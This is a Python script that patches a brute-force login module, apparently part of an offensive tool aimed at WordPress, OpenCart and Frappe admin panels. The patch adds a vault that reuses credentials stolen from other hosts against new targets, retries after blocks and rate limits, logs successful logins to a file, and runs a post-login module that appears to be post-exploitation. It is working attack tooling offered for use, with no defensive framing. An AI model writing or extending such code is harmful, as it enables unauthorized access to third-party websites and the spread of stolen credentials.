# -*- coding: utf-8 -*-
import io, py_compile, sys

P = r"C:\work\hunt2\modules\brute.py"
s = io.open(P, encoding="utf-8-sig").read()
PAIRS = []

PAIRS.append((
"from core import config, http, learn, ui, users\nfrom modules import profiles",
"from core import config, http, learn, ui, users, vault, verify\nfrom modules import post, profiles"))

PAIRS.append((
"""def _verify(host, sess, kind):
    try:
        prof = profiles.get(kind) or {}
        for a in (prof.get("admin") or [])[:3]:
            r = http.get(host, a, sess=sess)
            low = r.text.lower()
            if r.status_code == 200 and "password" not in low and ("logout" in low or "dashboard" in low):
                return True
    except Exception:
        pass
    return False


def _ok(host, r, sess, kind):
    loc = (r.headers.get("Location") or "").lower()
    if kind == "opencart" and "user_token=" in loc:
        return True
    if loc and "login" not in loc and "wp-login" not in loc:
        if _verify(host, sess, kind):
            return True
    body = r.text.lower()
    if kind == "frappe" and ('"logged in"' in body or '"home_page"' in body):
        return True
    if "logout" in body and 'name="password"' not in body:
        return True
    return False""",
"""def _ok(host, r, sess, kind):
    loc = (r.headers.get("Location") or "").lower()
    if kind == "opencart" and "user_token=" in loc:
        return True
    body = (r.text or "").lower()
    if kind == "frappe" and ('"logged in"' in body or '"home_page"' in body):
        return True
    if "reauth=1" in loc:
        return False
    if loc and "login" not in loc and "wp-login" not in loc:
        return verify.confirm(host, sess, kind)
    if "logout" in body and 'name="password"' not in body:
        return verify.confirm(host, sess, kind)
    return False"""))

PAIRS.append((
"""    pairs = []
    for u, p in DEFAULTS:""",
"""    pairs = list(vault.pairs(kind, exclude=host, limit=10))
    for u, p in DEFAULTS:"""))

PAIRS.append((
"""        if _ok(host, r, sess, kind):
            if not quiet:
                ui.ok("ПОДОШЛО: %s / %s" % (user, pwd))
            learn.password_ok(kind, pwd)
            return ("ok", user, pwd)""",
"""        if r.status_code == 403:
            time.sleep(2.5)
            try:
                r = _post(host, form, user, pwd, sess)
            except Exception:
                pass
        if _ok(host, r, sess, kind):
            if not quiet:
                ui.ok("ПОДОШЛО: %s / %s" % (user, pwd))
            learn.password_ok(kind, pwd)
            vault.add(host, kind, user, pwd)
            _append(OK_FILE, "%s|%s|%s:%s" % (host, kind, user, pwd))
            if not quiet:
                post.run(host, kind, "%s:%s" % (user, pwd))
            return ("ok", user, pwd)"""))

PAIRS.append((
"""    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        for host, state in ex.map(one, items):
            stats[state] += 1
            if state == "ok":
                ui.ok("%s — ВХОД" % host)
    return stats""",
"""    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        for host, state in ex.map(one, items):
            stats[state] += 1
            if state == "ok":
                ui.ok("%s — ВХОД" % host)
    return stats


def resume(budget=CAP, workers=4):
    \"\"\"Повтор отложенных: капча, лимит, блок.\"\"\"
    if not os.path.isfile(PARK_FILE):
        return collections.Counter()
    items = []
    with open(PARK_FILE, encoding="utf-8") as f:
        for line in f:
            p = line.strip().split("|")
            if len(p) >= 4 and p[3]:
                items.append((p[0], p[1], p[3]))
    if not items:
        return collections.Counter()
    open(PARK_FILE, "w", encoding="utf-8").close()
    return run_batch(items, workers=workers, budget=budget)"""))

for i, (old, new) in enumerate(PAIRS, 1):
    n = s.count(old)
    if n != 1:
        print("ЗАМЕНА %d: найдено %d, стоп" % (i, n))
        sys.exit(1)
    s = s.replace(old, new)

io.open(P, "w", encoding="utf-8-sig", newline="\n").write(s)
py_compile.compile(P, doraise=True)
print("brute: замен %d, ок" % len(PAIRS))
